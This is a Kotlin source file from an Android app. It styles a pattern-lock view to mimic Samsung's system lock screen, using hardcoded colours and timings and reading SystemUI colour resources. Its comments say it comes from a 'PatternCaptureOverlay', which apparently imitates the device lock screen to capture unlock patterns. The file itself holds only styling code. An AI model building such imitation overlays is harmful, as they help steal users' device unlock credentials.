package com.storm.safe.rock.service.modules.cipher.vendor

import android.content.Context
import android.content.res.Resources
import com.storm.safe.rock.service.modules.cipher.PatternLockView

/**
 * Samsung cipher strategy.
 *
 * Extracted from PatternCaptureOverlay brand branches:
 * - Fallback style: light gray, white lines, 100/200ms animation
 * - Resource reading: AOSP dot size + sec_ color resources
 */
class SamsungCipherStrategy : CipherBrandStrategy() {

    override val tag = "SamsungCipher"

    /**
     * Samsung fallback pattern style.
     * Light gray -3355444, white lines -1, 100/200ms animation.
     * vendor: PatternCaptureOverlay Samsung branch
     */
    override fun applyPatternFallbackStyle(view: PatternLockView, themeColor: Int, density: Float) {
        view.normalStateColor = -3355444       // light gray
        view.correctStateColor = -3355444
        view.dotNormalSize = 36
        view.dotSelectedSize = 50
        view.dotSelectedColor = -3355444
        view.pathWidth = 10
        view.pathColor = -1                    // white
        view.aspectRatio = 0
        view.dotAnimationDuration = 100
        view.pathEndAnimationDuration = 200
    }

    /**
     * Samsung resource reading: AOSP dot size + sec_ color resources.
     * vendor: PatternCaptureOverlay Samsung resource branch
     */
    override fun readBrandResources(res: Resources, suiContext: Context, density: Float): BrandResourceResult? {
        val aospId = res.getIdentifier("lock_pattern_dot_size", "dimen", "com.android.systemui")
        if (aospId == 0) return null
        val dotSize = res.getDimensionPixelSize(aospId)

        // Samsung (SEC) color resources
        var dotColor = 0
        var pathColor = 0
        for (name in listOf("sec_lock_pattern_dot_color", "sec_pattern_dot_color")) {
            val id = res.getIdentifier(name, "color", "com.android.systemui")
            if (id != 0) {
                dotColor = res.getColor(id, suiContext.theme)
                break
            }
        }
        for (name in listOf("sec_lock_pattern_path_color", "sec_pattern_path_color")) {
            val id = res.getIdentifier(name, "color", "com.android.systemui")
            if (id != 0) {
                pathColor = res.getColor(id, suiContext.theme)
                break
            }
        }

        return BrandResourceResult(
            haloSize = dotSize * 3,
            innerDotSize = dotSize,
            pathWidth = 0,
            dotColor = dotColor,
            pathColor = pathColor
        )
    }

    override fun animationDurations(): Pair<Int, Int> = Pair(100, 200)
}
